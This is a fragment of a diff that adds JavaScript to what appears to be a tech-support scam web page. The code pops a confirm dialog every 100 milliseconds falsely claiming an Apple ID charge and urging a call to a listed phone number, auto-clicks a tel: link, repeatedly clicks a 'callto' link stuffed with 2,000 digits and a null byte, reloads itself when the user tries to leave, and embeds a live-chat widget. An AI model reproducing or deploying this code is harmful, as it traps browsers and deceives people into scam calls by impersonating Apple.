+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-833-497-3164"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-833-497-3164 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
